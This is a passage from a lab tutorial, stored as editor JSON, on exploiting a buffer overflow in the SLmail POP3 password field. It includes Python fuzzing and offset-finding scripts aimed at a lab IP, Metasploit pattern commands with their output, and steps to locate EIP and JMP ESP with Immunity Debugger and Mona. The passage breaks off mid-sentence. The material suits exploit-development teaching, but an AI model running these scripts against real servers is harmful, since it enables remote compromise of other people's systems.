password:"}]}]},{"kind":"block","type":"code","key":"5c619379e7c8434fb36ee6799911306d","isVoid":false,"data":{"syntax":"python"},"nodes":[{"kind":"block","type":"code-line","key":"bd8c5f12d9e6423da3380cd340361cf3","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"6defeaa658014297815ecba944618297","ranges":[{"kind":"range","marks":[],"text":"#!/usr/bin/python"}]}]},{"kind":"block","type":"code-line","key":"82698371f60f47a3a2eb88d6db1de3cb","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"b6020606740f4060996c9eb7d56ce8cf","ranges":[{"kind":"range","marks":[],"text":"import socket"}]}]},{"kind":"block","type":"code-line","key":"4656169b69204782acc0c4c950296102","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"6b1be55bf3d34a9fb89475c998749392","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"55c09e792f27416080e63009b6197346","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"37d4acec2fee451dbc18ae186f251291","ranges":[{"kind":"range","marks":[],"text":"# Create an array where each item in the array will be a string of As"}]}]},{"kind":"block","type":"code-line","key":"f825fd436fb944588225db3bf8578f80","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"524db89f5b2c49bbb93c2d4e2ef0340b","ranges":[{"kind":"range","marks":[],"text":"buffer=[\"A\"]"}]}]},{"kind":"block","type":"code-line","key":"a5cb2d4920794cdaad46a90b4bfa56be","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"05e00877aa014d3bb4d928e099b2a90b","ranges":[{"kind":"range","marks":[],"text":"counter=100"}]}]},{"kind":"block","type":"code-line","key":"07332cecccd549059f360aa5f9e7b7f6","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"b6558d8086b845d9806a5003afe3e039","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"d48b74cc05a949e5b41b77577bf20b02","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"6c7026ad9e9a45a19ecb1089cb7757f2","ranges":[{"kind":"range","marks":[],"text":"# Use a loop to build the array, first with 100 As, then 300, then 500, etc."}]}]},{"kind":"block","type":"code-line","key":"b11b65160343498db0e76dc31d71ddcd","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"20a48acf401f416fa221fae5bd02cd87","ranges":[{"kind":"range","marks":[],"text":"while len(buffer) \u003c= 30:"}]}]},{"kind":"block","type":"code-line","key":"41091af448c14d32aa9b1f8e07f1da58","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"4b56956183dd4e6997baa72e7050c0fa","ranges":[{"kind":"range","marks":[],"text":"    buffer.append(\"A\"*counter)"}]}]},{"kind":"block","type":"code-line","key":"df4bc55024a8404dbf94972e5f091338","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"fbcf1de14a8c4716844976b1bbd7f692","ranges":[{"kind":"range","marks":[],"text":"    counter=counter+200"}]}]},{"kind":"block","type":"code-line","key":"395615e6fb044ec9ad527dda95b926a1","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"e0de591b65bc4f4c902d3a994b65cfe7","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"cb6ba5081c8b40b3b35bf23ab2237d12","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"ba35c1b85f394215b92104afb97f0981","ranges":[{"kind":"range","marks":[],"text":"# Try each string of As in the array as a password value"}]}]},{"kind":"block","type":"code-line","key":"c5d1a0825e134eb8a817945ee1b20add","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"eeca2c053b114ba999ce960a11995777","ranges":[{"kind":"range","marks":[],"text":"for string in buffer:"}]}]},{"kind":"block","type":"code-line","key":"7e06dc35380b48f4840be772ab3e4e98","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"aab30b6af9ef44a1abfe7a2af47a3674","ranges":[{"kind":"range","marks":[],"text":"    print \"Fuzzing PASS with %s bytes\" % len(string)"}]}]},{"kind":"block","type":"code-line","key":"5d43f1a2ef654b56a15eb22494f7ebe7","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"94e46954277c4580a0b2ee6ede8779e6","ranges":[{"kind":"range","marks":[],"text":"    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)"}]}]},{"kind":"block","type":"code-line","key":"4e3002fb6ce847b2b0ffa15701940ae1","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"8f3e4a5d74c847aebef368269a89df00","ranges":[{"kind":"range","marks":[],"text":"# Connect to Windows 7 machine IP, POP3 service"}]}]},{"kind":"block","type":"code-line","key":"7216c3c94ae540619d8e2ff1dd62b271","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"9cf159fb81544561b383276418420b43","ranges":[{"kind":"range","marks":[],"text":"    connect=s.connect(('10.0.0.1',110)) "}]}]},{"kind":"block","type":"code-line","key":"1036a170850b47d3988b40716af2a38d","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"9549e5e07a2a4633acb71f0b21c5f700","ranges":[{"kind":"range","marks":[],"text":"    s.recv(1024)"}]}]},{"kind":"block","type":"code-line","key":"b6478bbf17c346a18094a009d7d63ffc","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"ea8adb7ee44947269b8cb4ea56fa51e1","ranges":[{"kind":"range","marks":[],"text":"    s.send('USER username\\r\\n')"}]}]},{"kind":"block","type":"code-line","key":"09fe6fdcb72642f58b97538dd6d6099a","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"4c7a091b45154ba19c3a56c132e83fb0","ranges":[{"kind":"range","marks":[],"text":"    s.recv(1024)"}]}]},{"kind":"block","type":"code-line","key":"94b1f086027c477cac8c26f2ff40c721","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"20fe2ff8ec9f4ec5bd3f94b968af2801","ranges":[{"kind":"range","marks":[],"text":"    s.send('PASS ' + string + '\\r\\n')"}]}]},{"kind":"block","type":"code-line","key":"feae9bf9c89c43f0b48f197379e9b344","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"f8f60d5789d4470e93e662ca4856d49c","ranges":[{"kind":"range","marks":[],"text":"    s.send('QUIT\\r\\n')"}]}]},{"kind":"block","type":"code-line","key":"8e5b8a8edf3a498e83f808171d4f96b4","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"4c8f03398c64429a80e92bb91002b8fb","ranges":[{"kind":"range","marks":[],"text":"    s.close()"}]}]}]},{"kind":"block","type":"paragraph","key":"b37acbbc52e5492585c8400bfda00a58","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"26be80b2d0784550ad7b418e115ce552","ranges":[{"kind":"range","marks":[],"text":"Open Immunity Debugger, click "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"File \u003e Attach"},{"kind":"range","marks":[],"text":" and choose "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"SLmail.exe"},{"kind":"range","marks":[],"text":". You'll see "}]},{"kind":"inline","type":"link","key":"0db1c538f5ff4470a27ceffa429f2ff7","isVoid":false,"data":{"href":"https://sgros-students.blogspot.com/2014/05/immunity-debugger-basics-part-1.html"},"nodes":[{"kind":"text","key":"496adcdc9dcf44bb90491a4e721ff1b4","ranges":[{"kind":"range","marks":[],"text":"four quadrants of gibberish"}]}]},{"kind":"text","key":"d65149924c264c6bbcd67ca2a25136f1","ranges":[{"kind":"range","marks":[],"text":" representing machine language, registers, dump and stack. The program will be paused, so you'll need to hit the Play icon or F9 to run it."}]}]},{"kind":"block","type":"paragraph","key":"df95fa5dae254426b764fcd9401a548d","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"1ea20268cafd47a59515fd3708563d75","ranges":[{"kind":"range","marks":[],"text":"Then run the above python script and observe the output in the terminal. It should hang after the message "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"Fuzzing PASS with 2900 bytes"},{"kind":"range","marks":[],"text":", which tells you that a crash occurs somewhere around 2700 bytes. Meanwhile, Immunity Debugger will show that the EIP has been overwritten with "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"41414141"},{"kind":"range","marks":[],"text":", or more specifically, a bunch of As. An \"A\" in hex is represented by "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"41"},{"kind":"range","marks":[],"text":"."}]}]},{"kind":"block","type":"image","key":"c9f27acaaec747b09edb8809a8524d60","isVoid":true,"data":{"assetID":"-LT9UVgfWuGk9QWpiKQ2","caption":"EIP overwritten with a string of As"},"nodes":[{"kind":"text","key":"041faa55b99948479ac60747eafb9171","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"paragraph","key":"17d0bcd3de634c6bb07c9d9a8e653a81","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"929ba0ef2bda4214abb5d2ac6a4173ff","ranges":[{"kind":"range","marks":[],"text":"The EIP is important because it is the instruction pointer - it holds the memory address of the next instruction to be carried out. The goal is to overwrite the EIP with a new memory address which points to malicious code. To do this, you need to find out exactly how many characters it takes to reach the EIP without overwriting it."}]}]},{"kind":"block","type":"paragraph","key":"965d1d641f0c401ea41c00730a0abe06","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"0f5fe3088b6141ea885fb1ed843c028e","ranges":[{"kind":"range","marks":[],"text":"The fastest way to do this is to send a unique, 2700-character string as the password and observe which character segment overwrites the EIP. This can be done in Kali using Metasploit's "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"pattern_create"},{"kind":"range","marks":[],"text":" tool:"}]}]},{"kind":"block","type":"code","key":"5fc0a09e1bb84f3ba7c2aecf61685431","isVoid":false,"data":{"syntax":"text"},"nodes":[{"kind":"block","type":"code-line","key":"1f808326af4a4fdba4a608486d0dcaa4","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"756de0ee84d54d098569626e1e2fa543","ranges":[{"kind":"range","marks":[],"text":"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700"}]}]}]},{"kind":"block","type":"paragraph","key":"b95dc408387945af89b2f3bd48041457","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"10ce0eb96f804986918f2c60561f835c","ranges":[{"kind":"range","marks":[],"text":"This will produce a block of unique characters that you can plug into your script instead of the As:"}]}]},{"kind":"block","type":"code","key":"835277c334764bb3b18183b531ffaa24","isVoid":false,"data":{"syntax":"python"},"nodes":[{"kind":"block","type":"code-line","key":"c09ea1c95b5745478f1342108a362621","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"152b82302fb645e1b790b7a515baf69f","ranges":[{"kind":"range","marks":[],"text":"#!/usr/bin/python"}]}]},{"kind":"block","type":"code-line","key":"a5eb03cb95894444a1a81e035dfe98af","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"6d039b0fea8b41b6a161af662611770a","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"ca0763e9d058485ea0ba275a489b9dd4","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"0221272c86ab450bbfe530d794a97df9","ranges":[{"kind":"range","marks":[],"text":"import socket"}]}]},{"kind":"block","type":"code-line","key":"29e03fc1fcfd4f5ba02b5f470cb9a9ca","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"8be45a28694146178859fd9080e3d01f","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"6f3b050fc284463095f76701ff85d1b0","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"78f51cda68f34e4aaa2b99c928e30731","ranges":[{"kind":"range","marks":[],"text":"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"}]}]},{"kind":"block","type":"code-line","key":"9536dd1e34b84ed7a99f16173de0e0c2","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"2cf6b09b0fff419f916afa82cb1ff0fe","ranges":[{"kind":"range","marks":[],"text":"# Buffer with unique character string"}]}]},{"kind":"block","type":"code-line","key":"1c784e97756b4e97acb5f2831b0e098b","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"3392d996d6f344edbcc6eca893c8a4b0","ranges":[{"kind":"range","marks":[],"text":"buffer = \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9\""}]}]},{"kind":"block","type":"code-line","key":"3c4b857453244442a63f5fb69a84da91","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"fb73442bf14a4909b3555d084543798d","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"ae26256b777c4355ae513e3e7efe4b47","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"4acc1f16708a4c6fb0ca4764ca8af89a","ranges":[{"kind":"range","marks":[],"text":"try: "}]}]},{"kind":"block","type":"code-line","key":"00eddc14c5494785b86822c883eb362d","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"3ceb8c05fa6f4af58e8e7277bc5a5a86","ranges":[{"kind":"range","marks":[],"text":"    print \"\\nSending buffer...\""}]}]},{"kind":"block","type":"code-line","key":"36dd00718d0a4891aa810a8e91fa2b75","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"2486451a1d91458fbcd9310bc2c2d47a","ranges":[{"kind":"range","marks":[],"text":"# Connect to Windows 7 machine, POP3 service    "}]}]},{"kind":"block","type":"code-line","key":"eb0b2da948944332abf02c29a11440c0","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"d54efe4b83404094865020c8582eac02","ranges":[{"kind":"range","marks":[],"text":"    s.connect(('10.0.0.1',110))"}]}]},{"kind":"block","type":"code-line","key":"b3fcc6bd2eea4280b29cbad82a136cb3","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"05a5e6b4dcc149c58b78d4efe69ddaa1","ranges":[{"kind":"range","marks":[],"text":"    data = s.recv(1024)"}]}]},{"kind":"block","type":"code-line","key":"f38a9484f88d4d0a91eb71914d8acc28","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"11bba811254d423aac71fbb4050f078b","ranges":[{"kind":"range","marks":[],"text":"    s.send('USER username' + '\\r\\n')"}]}]},{"kind":"block","type":"code-line","key":"b4572ed64c8c4d82bd3e4d2e972ceb7d","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"de4a295a1c05440c883b554a61bba8c9","ranges":[{"kind":"range","marks":[],"text":"    data = s.recv(1024)"}]}]},{"kind":"block","type":"code-line","key":"694bed1a0832407c864e2b5affe7b73a","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"b5a59135f77d4606861ab66b04b4c8ca","ranges":[{"kind":"range","marks":[],"text":"    s.send('PASS ' + buffer + '\\r\\n')"}]}]},{"kind":"block","type":"code-line","key":"ee3e42d117de4741a4e2987a8be17ea6","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"1ce2b7fca74541388e34b7af71f6bdcf","ranges":[{"kind":"range","marks":[],"text":"    print \"\\nDone!\""}]}]},{"kind":"block","type":"code-line","key":"5ee2247fdabb4227981a6d744819dc50","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"c44263e789574f53afd8d8e50f54da9d","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"ac543cb43b91439a828dd0e7ba1bac08","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"98d11322b6684fa7a493efa4aed94134","ranges":[{"kind":"range","marks":[],"text":"except:"}]}]},{"kind":"block","type":"code-line","key":"73f79ed559344e168459ad734966ff7e","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"e9c0b2c3f8fa4b8f9fde54ad9724bdf2","ranges":[{"kind":"range","marks":[],"text":"    print \"Could not connect!\""}]}]}]},{"kind":"block","type":"paragraph","key":"bab27719bd3f4100b964c65249a70702","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"4e32312361cc4fa1817d2d45308a5162","ranges":[{"kind":"range","marks":[],"text":"When you run this script, the EIP will be written with some fragment of this unique string:"}]}]},{"kind":"block","type":"image","key":"0e59900e58f046269b8d65d0f2209725","isVoid":true,"data":{"assetID":"-LT9dMGb2T6qC5vmFqI4","caption":"EIP written with unique string fragment"},"nodes":[{"kind":"text","key":"67b6be208d304955a3ea8d973888c9e1","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"paragraph","key":"c5bd2746e3af450085528fa7b3ba54b4","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"698a03c5d6814d9197f6ac9de33c78da","ranges":[{"kind":"range","marks":[],"text":"You can use Metasploit's "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"pattern_offset"},{"kind":"range","marks":[],"text":" tool to find the location of the "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"39694438"},{"kind":"range","marks":[],"text":"fragment in the unique string:"}]}]},{"kind":"block","type":"paragraph","key":"c230ea620ea84bdbb40dcf8cd8f95e00","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"2d0ef152eb78441fb859a747abd45dc8","ranges":[{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438\n[*] Exact match at offset 2606"},{"kind":"range","marks":[],"text":"\n\nSo the exact position of the EIP is "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"bold"}],"text":"2606"},{"kind":"range","marks":[],"text":". "}]}]},{"kind":"block","type":"heading-2","key":"9f2ba0a26eee45c284226234f58fef67","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"7813dbfa43ba411bb448b7a881e2953e","ranges":[{"kind":"range","marks":[],"text":"Redirect execution of the program"}]}]},{"kind":"block","type":"paragraph","key":"b12d07eaf504494999a5cacf1d1f62bc","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"50f2acb722b348788df8d56cb05a4854","ranges":[{"kind":"range","marks":[],"text":"The next step is to give the EIP (instruction pointer) directions to our malicious shellcode. How do we know where our shellcode will end up in memory? At this stage it's helpful to see how these exploits are typically structured:"}]}]},{"kind":"block","type":"image","key":"6cb6ef43b556417080b1bc48389d0b1b","isVoid":true,"data":{"assetID":"-LTy6h5PM8kC1O7NPz4_","caption":"Buffer overflow exploit structure (simplified)"},"nodes":[{"kind":"text","key":"24b438b980d34a48b34cec4994809ad8","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"paragraph","key":"573cb56c291a46b987abe04fbb486a99","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"af4f6802c49640c4b366aa7ad9b79567","ranges":[{"kind":"range","marks":[],"text":"Recall that this exploit involves shoving a big string of characters into the SLmail password field. As shown in the diagram, the string starts out with some filler characters, enough to touch the EIP. Then we have the EIP, which contains a 4-byte memory address pointing to our shellcode. After the EIP, there is a "}]},{"kind":"inline","type":"link","key":"830e1919bb9f42789335bfa47dadcfaa","isVoid":false,"data":{"href":"https://en.wikipedia.org/wiki/NOP_slide"},"nodes":[{"kind":"text","key":"5e67f630d61443d69d1af5d247e166e7","ranges":[{"kind":"range","marks":[],"text":"nop sled"}]}]},{"kind":"text","key":"ea8c968ecadb4ddb814e9600dc8178e6","ranges":[{"kind":"range","marks":[],"text":" for wiggle room. Finally, we have our shellcode."}]}]},{"kind":"block","type":"paragraph","key":"085bb51ae37b42c185f89fb7bd8541ea","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"c7853fb297ea4a0dac2a17a4786a4d56","ranges":[{"kind":"range","marks":[],"text":"Because of how this exploit string is structured, you'll notice that the "}]},{"kind":"inline","type":"link","key":"76a0a6c9e439456fb79bc78148e35e0f","isVoid":false,"data":{"href":"https://security.stackexchange.com/a/181246"},"nodes":[{"kind":"text","key":"4831e05033364709aa87ff37ee4f8b0b","ranges":[{"kind":"range","marks":[],"text":"stack pointer (ESP) is pointing right at our payload."}]}]},{"kind":"text","key":"5bd01007727f4de78ae3813b27250b38","ranges":[{"kind":"range","marks":[],"text":" That means you don't need to give the EIP the exact address of your shellcode - you can simply tell it to jump to the stack pointer and execute whatever is there. Conveniently, there is an instruction known as "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"JMP ESP"},{"kind":"range","marks":[],"text":" which does exactly that! If you can find a "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"JMP ESP"},{"kind":"range","marks":[],"text":" instruction somewhere else in the program, you can give its memory address to the EIP and it will jump to your payload."}]}]},{"kind":"block","type":"heading-3","key":"2deda13b89f049a586dd8dea2e3cfe54","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"41bcb82afc2046508ae7e16b6902f484","ranges":[{"kind":"range","marks":[],"text":"Finding JMP ESP"}]}]},{"kind":"block","type":"paragraph","key":"11bded1fd62d48ba822dc9df0fc017a1","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"baa1e9c423144b41897d07fcf869dcfc","ranges":[{"kind":"range","marks":[],"text":"Using Mona.py, you can pull up a list of modules loaded with the SLmail program by typing "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"!mona modules"},{"kind":"range","marks":[],"text":" into the bottom text box. The true/false columns in the middle show which ones were compiled "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"bold"}],"text":"without "},{"kind":"range","marks":[],"text":"buffer overflow protections ("}]},{"kind":"inline","type":"link","key":"61d4e62f35694066b9cc302d5ad44eb7","isVoid":false,"data":{"href":"https://security.stackexchange.com/questions/18556/how-do-aslr-and-dep-work"},"nodes":[{"kind":"text","key":"4fad3c4a813849728c8256383f07d189","ranges":[{"kind":"range","marks":[],"text":"DEP and ASLR"}]}]},{"kind":"text","key":"67525b8f2fc64492ab940baa0bd61d6e","ranges":[{"kind":"range","marks":[],"text":"). "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"SLMFC.dll"},{"kind":"range","marks":[],"text":" seems to fit the bill nicely."}]}]},{"kind":"block","type":"image","key":"26e851d08ede404394c26a34e7b74ef1","isVoid":true,"data":{"assetID":"-LTieU6Am0mzIIiE6AZj","caption":"use Mona.py to list all the modules loaded with the program"},"nodes":[{"kind":"text","key":"b54c9f5cf788457798ff27ea91b533ae","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"paragraph","key":"5b7aee78df8e46c3bfc8d2aaea72324c","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"a452f26c6cb5432889269c40d2ffceaf","ranges":[{"kind":"range","marks":[],"text":"Click the tiny "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"e"},{"kind":"range","marks":[],"text":" button on Immunity’s top bar to bring up a list of executable modules and highlight SLMFC. Double-clicking on this item will show us the instructions in the DLL. We can then right-click and choose "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"Search for \u003e Command"},{"kind":"range","marks":[],"text":" (or use Ctrl + F) to find a "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"JMP ESP"},{"kind":"range","marks":[],"text":" command. If you don't find one, you can search for the 